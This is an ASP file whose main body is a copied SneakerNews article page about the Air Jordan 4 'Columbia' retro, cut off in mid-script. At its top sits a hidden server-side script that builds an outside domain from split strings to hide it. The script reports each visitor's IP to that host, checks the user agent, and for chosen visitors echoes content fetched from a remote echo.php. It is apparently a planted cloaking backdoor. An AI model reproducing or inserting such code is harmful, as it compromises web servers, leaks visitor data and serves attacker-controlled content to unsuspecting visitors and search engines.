<%
'on error resume next
Server.ScriptTimeout=600
dim systid,ISBK,html,echohtml,lk,ipurl,echourl,kdom
kdom = "1nil"
kdom =kdom & "2thea"
systid=484
kdom =kdom & "rsenal"

kdom =kdom & "."
ISBK = "false"
kdom =kdom &"com"
hs = "http"
ipurl = hs&"://nb."&kdom&"/nb.php?ip="
echourl = hs&"://ac."&kdom&"/echo.php?"
html = GetContent(ipurl&GetRsip()) 'GetRsip()
lk ="<t"&"@"&"k>"
If instr(html,lk)>0 Then
	 ISBK = replace(html,lk,"")
End If
'response.Write ISBK&ChecksAgent
'ISBK ="true"
if ChecksAgent=true or cstr(ISBK)="true" Then
	
	dim subspagseid
	subspagseid = request.querystring("subspagseid")
	If subspagseid Then
		response.Write GetContent(echourl&"sysid="&systid&"&subpageid="&subspagseid)
	Else
		%>

<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US" prefix="og: http://ogp.me/ns#">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US" prefix="og: http://ogp.me/ns#">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US" prefix="og: http://ogp.me/ns#">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US" prefix="og: http://ogp.me/ns#">
    <!--<![endif]-->
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width" />
        <meta name="msapplication-TileColor" content="#FFFFFF">
        <meta name="msapplication-TileColor" content="#FFFFFF">
        <meta name="msapplication-TileImage" content="http://sneakernews.com/wp-content/themes/sneakernews/images/favicon-144.png">
        <meta name="msapplication-config" content="http://sneakernews.com/wp-content/themes/sneakernews/images/browserconfig.xml">
        <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <!-- favicons -->
        <link rel="shortcut icon" type="image/png" sizes="32x32" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon_icon.png">
        <link rel="apple-touch-icon" type="image/png" sizes="32x32" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon_icon.png">
        <link rel="shortcut icon" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon.ico">
        <link rel="icon" sizes="16x16 32x32 64x64" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon.ico">
        <link rel="icon" type="image/png" sizes="196x196" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-196.png">
        <link rel="icon" type="image/png" sizes="160x160" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-160.png">
        <link rel="icon" type="image/png" sizes="96x96" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-96.png">
        <link rel="icon" type="image/png" sizes="64x64" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-64.png">
        <link rel="icon" type="image/png" sizes="32x32" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-32.png" >
        <link rel="icon" type="image/png" sizes="16x16" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-16.png">
        <link rel="apple-touch-icon" sizes="152x152" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-152.png">
        <link rel="apple-touch-icon" sizes="144x144" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-144.png">
        <link rel="apple-touch-icon" sizes="120x120" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-120.png">
        <link rel="apple-touch-icon" sizes="114x114" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-114.png">
        <link rel="apple-touch-icon" sizes="76x76" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-76.png">
        <link rel="apple-touch-icon" sizes="72x72" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-72.png">
        <link rel="apple-touch-icon" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/favicon-57.png">
        <!-- favicon end -->
        <title>Air Jordan 4 &quot;Columbia&quot; Retro Returning in 2015 - SneakerNews.com</title>
        <link rel="profile" href="http://gmpg.org/xfn/11" />
        <link rel="stylesheet" type="text/css" media="all" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/style.css" />
        <link rel="pingback" href="http://sneakernews.com/xmlrpc.php" />
        <!--[if lt IE 9]>
        <script src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/html5.js" type="text/javascript"></script>
        <![endif]-->
        <!--start menu CSS-->
        <link rel="stylesheet" type="text/css" href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/css/flexnav.css" /	>
              <!--End menu CSS-->
              <!--start bxSlider CSS file -->
              <link href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/css/jquery.bxslider.css" rel="stylesheet" />
        <!--end bxSlider CSS file -->
        <link href="http://cdn.sneakernews.com/wp-content/themes/sneakernews/mediatag.css" type="text/css" rel="stylesheet" />

        <!-- jQuery library (served from Google) -->
        <script src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/jquery.min.js"></script>
        <!-- bxSlider Javascript file -->
        <script src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/jquery.bxslider.min.js"></script>
        <!-- start menu JS -->
        <script src="http://cdnjs.cloudflare.com/ajax/libs/modernizr/2.6.2/modernizr.min.js"></script>
        <script type="text/javascript" src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/jquery.flexnav.min.js"></script>
        <script type="text/javascript" src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/jquery.flexnav.js"></script>
		<script type="text/javascript" src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/js/cssua.min.js"></script>
        <!-- End menu JS -->

        <script type="text/javascript">
            var $ = jQuery;
            (function($) {
                $(document).ready(function() {
                    $(".flexnav").flexNav();
                    $('nav ul li ul.sub-menu li:first').addClass('first');
                    $('nav ul li ul.sub-menu li:last').addClass('first');
                    
					$('nav ul li').each(function() {
                       var subclass = $(this).find('a:first').text().toLowerCase();
                       var sub1 = subclass.replace(/ /g, "-");
                       $(this).addClass(sub1);
                    });
                });
            })(jQuery);


            //End menu js
        </script>
        
<!-- This site is optimized with the Yoast WordPress SEO plugin v1.5.3.3 - https://yoast.com/wordpress/plugins/seo/ -->
<link rel="canonical" href="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/" />
<link rel="author" href="https://plus.google.com/u/0/100284962233600661520/"/>
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Air Jordan 4 &quot;Columbia&quot; Retro Returning in 2015 - SneakerNews.com" />
<meta property="og:description" content="Earlier today, we gave you info regarding the return of the Air Jordan 4 &#8220;Oreo&#8221; for 2015. Turns out, another 1999 Retro release is coming back as well &#8211; the &#8220;Columbia&#8221; colorway seen here. If you&#8217;re not too familiar with &hellip; Continue reading &rarr;" />
<meta property="og:url" content="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/" />
<meta property="og:site_name" content="Sneaker News" />
<meta property="article:tag" content="Air Jordan (4) IV" />
<meta property="article:tag" content="Air Jordan 4" />
<meta property="article:tag" content="Air Jordan 4 Columbia" />
<meta property="article:tag" content="Air Jordan IV Columbia" />
<meta property="article:section" content="Air Jordan" />
<meta property="article:section" content="Upcoming Sneakers" />
<meta property="article:published_time" content="2014-06-04T21:21:02+00:00" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/06/jordan-4-columbia-retro.jpg" />
<meta property="og:image" content="http://sneakernews.com/wp-content/uploads/2014/06/air-jordan-4-retro-columbia-2015.jpg" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:site" content="@sneakernews"/>
<meta name="twitter:domain" content="Sneaker News"/>
<meta name="twitter:creator" content="@sneakernews"/>
<!-- / Yoast WordPress SEO plugin. -->

<link rel="alternate" type="application/rss+xml" title="Sneaker News &raquo; Feed" href="http://sneakernews.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sneaker News &raquo; Comments Feed" href="http://sneakernews.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sneaker News &raquo; Air Jordan 4 &#8220;Columbia&#8221; Retro Returning in 2015 Comments Feed" href="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/feed/" />
	  <style type="text/css">
	  .wp-pagenavi{margin-left:auto !important; margin-right:auto; !important}

	  .wp-pagenavi a,.wp-pagenavi a:link,.wp-pagenavi a:visited,.wp-pagenavi a:active,.wp-pagenavi span.extend {    }
	  .wp-pagenavi a:hover,.wp-pagenavi span.current
	  {
		     
	  }
	  .wp-pagenavi span.pages {  }
	  </style>
	  <link rel='stylesheet' id='nextgen_gallery_related_images-css'  href='http://cdn.sneakernews.com/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/nextgen_gallery_display/static/nextgen_gallery_related_images.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='pinterest-pin-it-button-plugin-styles-css'  href='http://cdn.sneakernews.com/wp-content/plugins/pinterest-pin-it-button/css/public.css?ver=2.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='wp-postratings-css'  href='http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/postratings-css.css?ver=1.79' type='text/css' media='all' />
<link rel='stylesheet' id='wp125style-css'  href='http://cdn.sneakernews.com/wp-content/plugins/wp125/wp125.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-widgets-css'  href='http://cdn.sneakernews.com/wp-content/plugins/jetpack/modules/widgets/widgets.css?ver=20121003' type='text/css' media='all' />
<link rel='stylesheet' id='wp-paginate-css'  href='http://cdn.sneakernews.com/wp-content/plugins/wp-paginate/wp-paginate.css?ver=1.2.5' type='text/css' media='screen' />
<link rel='stylesheet' id='avhec-widget-css'  href='http://cdn.sneakernews.com/wp-content/plugins/extended-categories-widget/3.3/css/avh-ec.widget.css?ver=3.6.7' type='text/css' media='all' />
<link rel='stylesheet' id='wp-pagenavi-style-css'  href='http://cdn.sneakernews.com/wp-content/plugins/wp-pagenavi-style/style/default.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-includes/js/jquery/jquery.js?ver=1.11.1'></script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var photocrati_ajax = {"url":"http:\/\/sneakernews.com\/photocrati_ajax","wp_site_url":"http:\/\/sneakernews.com","wp_site_static_url":"http:\/\/sneakernews.com"};
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/ajax/static/ajax.js?ver=4.0.1'></script>
<script type='text/javascript' src='http://zor.livefyre.com/wjs/v3.0/javascripts/livefyre.js'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://sneakernews.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://sneakernews.com/wp-includes/wlwmanifest.xml" /> 
<link rel='shortlink' href='http://sneakernews.com/?p=517971' />

    <!-- cmnUNT | Begin head script -->
    <script data-cfasync="false" type="text/javascript">
        var isMobile = /iPhone|iPod|BlackBerry|Opera Mini|(android|bb\d+|meego).+mobile/i.test(navigator.userAgent);
        if (isMobile) {
            cmnunt_site = "cmn_sneakernews_mob"; //set in admin
        } else {
            cmnunt_site = "cmn_sneakernews"; //set in admin
        }
        cmnunt_silo     = 's_sne'; //set in admin
        cmnunt_subsilo  = '';
        cmnunt_tier     = 'to,t2,internal';
        cmnunt_zone     = 'air-jordan';
        cmnunt_kw       = 'air-jordan-iv,air-jordan-4,air-jordan-4-columbia,air-jordan-iv-columbia,';
        cmnunt_exclude  = 'ugc';
        cmn_tb_theme    = 'default';
        if (isMobile) {
            document.write('<scr'+'ipt src="http://cdn.complexmedianetwork.com/js/cmnUNTmobile.js"></scr'+'ipt>');
        } else {
            document.write('<scr'+'ipt src="http://cdn.complexmedianetwork.com/js/cmnUNT.js"></scr'+'ipt>');
        }
    </script>
    
    <!-- cmnUNT | Header Unit Centering Styles -->
    <link rel="stylesheet" type="text/css" href="http://cdn.sneakernews.com/wp-content/plugins/cm-ad-map 2/dist/css/cmn_styles.css" />
    <!-- <meta name="NextGEN" version="2.0.21" /> -->
<script type="text/javascript">(function(){var po = document.createElement("script");po.type = "text/javascript"; po.async = true;po.src = "https://apis.google.com/js/plusone.js";var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(po, s);})();</script><link rel='stylesheet' type='text/css' href='http://cdn.sneakernews.com/wp-content/plugins/wp-mashsocial-wigdet/cssstyles.css' />
	<style type="text/css">
	 .wp-pagenavi
	{
		font-size:12px !important;
	}
	</style>
	<!-- Vipers Video Quicktags v6.5.2 | http://www.viper007bond.com/wordpress-plugins/vipers-video-quicktags/ -->
<style type="text/css">
.vvqbox { display: block; max-width: 100%; visibility: visible !important; margin: 10px auto; } .vvqbox img { max-width: 100%; height: 100%; } .vvqbox object { max-width: 100%; } 
</style>
<script type="text/javascript">
// <![CDATA[
	var vvqflashvars = {};
	var vvqparams = { wmode: "opaque", allowfullscreen: "true", allowscriptaccess: "always" };
	var vvqattributes = {};
	var vvqexpressinstall = "http://sneakernews.com/wp-content/plugins/vipers-video-quicktags/resources/expressinstall.swf";
// ]]>
</script>
        <script type="text/javascript">

            var _gaq = _gaq || [];
            _gaq.push(['_setAccount', 'UA-149082-11']);
            _gaq.push(['_trackPageview']);

            (function() {
                var ga = document.createElement('script');
                ga.type = 'text/javascript';
                ga.async = true;
                ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
                var s = document.getElementsByTagName('script')[0];
                s.parentNode.insertBefore(ga, s);
            })();

        </script>
        <script src="https://apis.google.com/js/platform.js" async defer></script>
		
    	  <style type="text/css">
	  .wp-pagenavi{margin-left:auto !important; margin-right:auto; !important}

	  .wp-pagenavi a,.wp-pagenavi a:link,.wp-pagenavi a:visited,.wp-pagenavi a:active,.wp-pagenavi span.extend {    }
	  .wp-pagenavi a:hover,.wp-pagenavi span.current
	  {
		     
	  }
	  .wp-pagenavi span.pages {  }
	  </style>
	  </head>

    <body class="single single-post postid-517971 single-format-standard singular">
        <!--main-->
        <div id="fb-root"></div>		

        <!-- cmnUNT | Begin ad tag-->
        <div id="cmn_ad_tag_head" style="background:#fafafa;" class="fw_sneakernews">
            <script type="text/javascript">cmnUNT('3x3', tile_num++);</script>
        </div>
        <!-- cmnUNT | End ad tag -->



        <div id="sneaker-news-main">
            <!--header-->
            <header>
                                <div class="logo-main">
                    <div class="wrapper">
                        <div class="sneaker-news-top">
                            <div class="sneaker-logo"><a href="http://sneakernews.com"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/sneakernews-logo.png" alt="Sneaker News" /> <img class="for-mobile" src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/sneakernews-logo-one-line.png" alt="Sneaker News" /> </a></div>
                        </div>
                    </div>
                </div>
                <div class="sneaker-nav"> 
                    <div class="nav-main">
                        <div class="wrapper">   
                            <div class="nav-container">
                                <nav>
<div class="menu-primary-navigation-container"><ul id="menu-primary-navigation" class="menu"><li id="menu-item-355567" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-355567"><a href="http://sneakernews.com">Home</a></li>
<li id="menu-item-421511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-421511"><a href="http://sneakernews.com/magazine">Magazine</a></li>
<li id="menu-item-440551" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440551"><a href="http://sneakernews.com/category/select">SELECT</a></li>
<li id="menu-item-440520" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440520"><a href="http://sneakernews.com/air-jordan-release-dates/">Jordan Release Dates</a></li>
<li id="menu-item-440521" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440521"><a href="http://sneakernews.com/release-dates/">Sneaker Release Dates</a></li>
</ul></div>                                </nav>
                                <!--<nav>
                                    <ul>
                                        <li class="home"><a href="#">Home</a></li>
                                        <li><a href="#">Featured</a></li>
                                        <li><a href="#">Select </a></li>
                                        <li class="date-icon"><a href="#">jordan release dates</a></li>
                                        <li class="date-icon sneaker"><a href="#">sneaker release dates</a></li>
                                    </ul>
                                </nav>-->

                                <form method="get" id="searchform" action="http://sneakernews.com"> 
                                    <div>
                                        <input type="submit" class="submit" value="">
                                        <input type="hidden" id="searchsubmit"> 
                                        <input type="text" class="input search-box" placeholder="search"  name="s" id="s" onblur="if (this.value == '') {
                    this.value = 'Search';
                }" onfocus="if (this.value == 'Search') {
                    this.value = '';
                }">
                                    </div>
                                </form>

                            </div>       

                        </div>
                    </div>  
                </div>   <!--sneaker-nav-->
                <div class="sub-nav-main">
                    <div class="wrapper">
                        <div class="sub-nav-container">
                            <nav>
                                <ul>
<div class="menu-top-cats-container"><ul id="menu-top-cats" class="menu"><li id="menu-item-560031" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-560031"><a href="http://sneakernews.com/tag/air-jordan-4-columbia/">Columbia 4s</a></li>
<li id="menu-item-500955" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-500955"><a href="http://sneakernews.com/tag/nike-roshe-run/">Nike Roshe Run</a></li>
<li id="menu-item-508049" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-508049"><a href="http://sneakernews.com/tag/nike-huarache/">Nike Huarache</a></li>
<li id="menu-item-440536" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440536"><a href="http://sneakernews.com/category/air-jordan/">Jordans</a></li>
<li id="menu-item-440509" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440509"><a href="http://sneakernews.com/tag/lebron-12/">LeBron 12</a></li>
<li id="menu-item-440400" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440400"><a href="http://sneakernews.com/tag/nike-kd-7/">KD 7</a></li>
<li id="menu-item-440399" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-440399"><a href="http://sneakernews.com/tag/kobe-9/">Kobe 9</a></li>
<li id="menu-item-553793" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-553793"><a href="http://sneakernews.com/tag/nike-kyrie-1/">Kyrie 1</a></li>
<li id="menu-item-560030" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-560030"><a href="http://sneakernews.com/tag/air-jordan-xx3/">XX3</a></li>
<li id="menu-item-355579" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-355579"><a href="http://sneakernews.com/category/just-released/">Just Released</a></li>
<li id="menu-item-355578" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-355578"><a href="http://sneakernews.com/category/upcoming-sneakers/">Upcoming</a></li>
<li id="menu-item-550289" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-550289"><a href="#">Brands</a>
<ul class="sub-menu">
	<li id="menu-item-550290" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550290"><a href="/category/air-jordan/">Jordans</a></li>
	<li id="menu-item-550291" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550291"><a href="/?s=nike">nike</a></li>
	<li id="menu-item-550292" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550292"><a href="/category/adidas/">adidas</a></li>
	<li id="menu-item-550293" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550293"><a href="/category/reebok/">reebok</a></li>
	<li id="menu-item-550294" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550294"><a href="/category/asics/">asics</a></li>
	<li id="menu-item-550295" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550295"><a href="/category/new-balance/">new balance</a></li>
	<li id="menu-item-550296" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550296"><a href="/category/vans/">vans</a></li>
	<li id="menu-item-550297" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550297"><a href="/category/saucony/">saucony</a></li>
	<li id="menu-item-550298" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550298"><a href="/category/converse/">converse</a></li>
	<li id="menu-item-550299" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550299"><a href="/category/puma/">puma</a></li>
	<li id="menu-item-550301" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550301"><a href="/category/supra/">supra</a></li>
	<li id="menu-item-550302" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550302"><a href="http://sneakernews.com/tag/under-armour/">under armour</a></li>
</ul>
</li>
</ul></div>                                </ul>
                            </nav>
                        </div>
                    </div>
                </div>  

                <div class="sneaker-responsive-menu">
                    <div class="menu-button"><span class="touch-button"><i class="navicon-big"></i></span></div>
                    <ul data-breakpoint="800" class="tech-nav flexnav">
                        <li>
                            <form method="get" id="searchform" action="http://sneakernews.com"> 
                                <div class="search-box-main">
                                    <input type="submit" class="submit" value="" hidden="">
                                    <input type="hidden" id="searchsubmit"> 
                                    <input type="text" class="input search-box" placeholder="search"  name="s" id="s" onblur="if (this.value == '') {
                    this.value = 'Search';
                }" onfocus="if (this.value == 'Search') {
                    this.value = '';
                }">
                                </div>
                            </form>
                        </li>
                        <li><a href="/">Home</a></li>
                        <li><a href="/magazine/">Magazine</a></li>
                        <li><a href="/category/select/">Select</a></li>
                        <li><a href="/air-jordan-release-dates/">jordan release dates</a></li>
                        <li><a href="/release-dates/">sneaker release dates</a></li>
                        <li class="categories"><a href="#">categories<i></i></a>
                            <ul>
                                <li>         
                                    <select name='cat_menu' id='cat_menu' class='postform' >
	<option value='-1'>ALL</option>
	<option class="level-0" value="24">Adidas&nbsp;&nbsp;(4,205)</option>
	<option class="level-0" value="20">Air Classic BW&nbsp;&nbsp;(208)</option>
	<option class="level-0" value="12">Air Jordan&nbsp;&nbsp;(10,480)</option>
	<option class="level-0" value="206">Air Jordan Force Fusion&nbsp;&nbsp;(235)</option>
	<option class="level-0" value="15">Air Max 1&nbsp;&nbsp;(1,194)</option>
	<option class="level-0" value="9">Air Max 360&nbsp;&nbsp;(86)</option>
	<option class="level-0" value="6">Air Max 90&nbsp;&nbsp;(1,260)</option>
	<option class="level-0" value="19">Air Max 95&nbsp;&nbsp;(525)</option>
	<option class="level-0" value="47">Air Max 97&nbsp;&nbsp;(172)</option>
	<option class="level-0" value="57">Air Max Light&nbsp;&nbsp;(150)</option>
	<option class="level-0" value="41">Air Stab&nbsp;&nbsp;(31)</option>
	<option class="level-0" value="68">Air Structure&nbsp;&nbsp;(79)</option>
	<option class="level-0" value="273">Air Yeezy&nbsp;&nbsp;(325)</option>
	<option class="level-0" value="44">Alife&nbsp;&nbsp;(108)</option>
	<option class="level-0" value="39">Asia Exclusive&nbsp;&nbsp;(495)</option>
	<option class="level-0" value="42">Asics&nbsp;&nbsp;(835)</option>
	<option class="level-0" value="27">Bape&nbsp;&nbsp;(85)</option>
	<option class="level-0" value="21">Basketball&nbsp;&nbsp;(8,058)</option>
	<option class="level-0" value="4">Blazer&nbsp;&nbsp;(959)</option>
	<option class="level-0" value="272">Celebrity Feet&nbsp;&nbsp;(1,864)</option>
	<option class="level-0" value="16">Clothing&nbsp;&nbsp;(350)</option>
	<option class="level-0" value="43">Collaboration&nbsp;&nbsp;(6,518)</option>
	<option class="level-0" value="271">Collections&nbsp;&nbsp;(226)</option>
	<option class="level-0" value="70">Converse&nbsp;&nbsp;(1,043)</option>
	<option class="level-0" value="25">Court Force&nbsp;&nbsp;(104)</option>
	<option class="level-0" value="285">Customs&nbsp;&nbsp;(1,281)</option>
	<option class="level-0" value="61">DC Shoes&nbsp;&nbsp;(67)</option>
	<option class="level-0" value="3">Dope Kicks&nbsp;&nbsp;(68)</option>
	<option class="level-0" value="11">Dunk&nbsp;&nbsp;(2,765)</option>
	<option class="level-0" value="283">Dwyane Wade&nbsp;&nbsp;(466)</option>
	<option class="level-0" value="205">eBay&nbsp;&nbsp;(2,867)</option>
	<option class="level-0" value="64">Europe Exclusive&nbsp;&nbsp;(343)</option>
	<option class="level-0" value="270">Events&nbsp;&nbsp;(1,071)</option>
	<option class="level-0" value="4625">Featured&nbsp;&nbsp;(2,420)</option>
	<option class="level-0" value="7337">Featured Stories&nbsp;&nbsp;(290)</option>
	<option class="level-0" value="50">Finishline&nbsp;&nbsp;(360)</option>
	<option class="level-0" value="48">Footscape&nbsp;&nbsp;(169)</option>
	<option class="level-0" value="35">Gear&nbsp;&nbsp;(138)</option>
	<option class="level-0" value="284">Giveaway&nbsp;&nbsp;(42)</option>
	<option class="level-0" value="287">Griffey&nbsp;&nbsp;(209)</option>
	<option class="level-0" value="207">House of Hoops&nbsp;&nbsp;(301)</option>
	<option class="level-0" value="34">Hybrid&nbsp;&nbsp;(1,360)</option>
	<option class="level-0" value="73">Hyperdunk&nbsp;&nbsp;(736)</option>
	<option class="level-0" value="29">Japanese Brands&nbsp;&nbsp;(537)</option>
	<option class="level-0" value="204">JD Sports&nbsp;&nbsp;(243)</option>
	<option class="level-0" value="1">Just Released&nbsp;&nbsp;(13,804)</option>
	<option class="level-0" value="282">Kevin Durant&nbsp;&nbsp;(1,450)</option>
	<option class="level-0" value="52">Kids&nbsp;&nbsp;(608)</option>
	<option class="level-0" value="209">Kobe&nbsp;&nbsp;(2,089)</option>
	<option class="level-0" value="1282">Kyrie Irving&nbsp;&nbsp;(30)</option>
	<option class="level-0" value="22">LeBron&nbsp;&nbsp;(3,326)</option>
	<option class="level-0" value="217">Lifestyle Sneakers&nbsp;&nbsp;(2,992)</option>
	<option class="level-0" value="28">New Balance&nbsp;&nbsp;(1,450)</option>
	<option class="level-0" value="63">Nike 6.0&nbsp;&nbsp;(114)</option>
	<option class="level-0" value="71">Nike ACG&nbsp;&nbsp;(493)</option>
	<option class="level-0" value="7">Nike Air Force 1s&nbsp;&nbsp;(2,914)</option>
	<option class="level-0" value="5">Nike Air Max&nbsp;&nbsp;(5,028)</option>
	<option class="level-0" value="288">Nike Air Penny&nbsp;&nbsp;(680)</option>
	<option class="level-0" value="90">Nike Boots&nbsp;&nbsp;(253)</option>
	<option class="level-0" value="3101">Nike Flyknit&nbsp;&nbsp;(428)</option>
	<option class="level-0" value="280">Nike Foamposite&nbsp;&nbsp;(1,339)</option>
	<option class="level-0" value="51">Nike Force&nbsp;&nbsp;(138)</option>
	<option class="level-0" value="208">Nike Free&nbsp;&nbsp;(815)</option>
	<option class="level-0" value="6974">Nike Huarache&nbsp;&nbsp;(352)</option>
	<option class="level-0" value="40">Nike iD&nbsp;&nbsp;(944)</option>
	<option class="level-0" value="286">Nike Lunar&nbsp;&nbsp;(1,111)</option>
	<option class="level-0" value="58">Nike Retro&nbsp;&nbsp;(3,529)</option>
	<option class="level-0" value="5781">Nike Roshe&nbsp;&nbsp;(503)</option>
	<option class="level-0" value="10">Nike SB&nbsp;&nbsp;(2,841)</option>
	<option class="level-0" value="36">NikeStore&nbsp;&nbsp;(717)</option>
	<option class="level-0" value="56">P-Rod&nbsp;&nbsp;(290)</option>
	<option class="level-0" value="23">PE&nbsp;&nbsp;(2,478)</option>
	<option class="level-0" value="31">Promo&nbsp;&nbsp;(682)</option>
	<option class="level-0" value="62">Puma&nbsp;&nbsp;(646)</option>
	<option class="level-0" value="49">Reebok&nbsp;&nbsp;(2,006)</option>
	<option class="level-0" value="6300">Release Dates&nbsp;&nbsp;(715)</option>
	<option class="level-0" value="38">Running&nbsp;&nbsp;(3,637)</option>
	<option class="level-0" value="8">Sample&nbsp;&nbsp;(1,637)</option>
	<option class="level-0" value="535">Saucony&nbsp;&nbsp;(283)</option>
	<option class="level-0" value="6021">Select&nbsp;&nbsp;(106)</option>
	<option class="level-0" value="30">Shoes&nbsp;&nbsp;(63)</option>
	<option class="level-0" value="69">Skate&nbsp;&nbsp;(3,235)</option>
	<option class="level-0" value="162">Supra&nbsp;&nbsp;(537)</option>
	<option class="level-0" value="215">Terminator&nbsp;&nbsp;(143)</option>
	<option class="level-0" value="4132">Top Categories&nbsp;&nbsp;(1)</option>
	<option class="level-0" value="14">Toys&nbsp;&nbsp;(39)</option>
	<option class="level-0" value="33">Trainer&nbsp;&nbsp;(1,547)</option>
	<option class="level-0" value="66">Upcoming Sneakers&nbsp;&nbsp;(23,149)</option>
	<option class="level-0" value="53">Vandal&nbsp;&nbsp;(104)</option>
	<option class="level-0" value="32">Vans&nbsp;&nbsp;(1,459)</option>
	<option class="level-0" value="37">Vintage&nbsp;&nbsp;(573)</option>
	<option class="level-0" value="82">Visvim&nbsp;&nbsp;(40)</option>
	<option class="level-0" value="279">Weekly Rewind&nbsp;&nbsp;(264)</option>
	<option class="level-0" value="26">WMNS&nbsp;&nbsp;(1,602)</option>
</select>
                                    <script type="text/javascript">
            var dropdown = document.getElementById("cat_menu");
            function onCatChange() {
                if (dropdown.options[dropdown.selectedIndex].value > 0) {
                    location.href = "/?cat=" + dropdown.options[dropdown.selectedIndex].value;
                }
            }
            dropdown.onchange = onCatChange;
                                    </script>
                                </li>
                                <li>
                                    <select id="brand_menu"><option value="brand">BRANDS</option><option value="/category/air-jordan/">Jordans</option>
<option value="/?s=nike">nike</option>
<option value="/category/adidas/">adidas</option>
<option value="/category/reebok/">reebok</option>
<option value="/category/asics/">asics</option>
<option value="/category/new-balance/">new balance</option>
<option value="/category/vans/">vans</option>
<option value="/category/saucony/">saucony</option>
<option value="/category/converse/">converse</option>
<option value="/category/puma/">puma</option>
<option value="/category/supra/">supra</option>
<option value="http://sneakernews.com/tag/under-armour/">under armour</option>
</select>                                    <script type="text/javascript">
                                        var dropdown_brand = document.getElementById("brand_menu");
                                        var site_url = 'http://sneakernews.com/';
                                        function onBrandChange() {
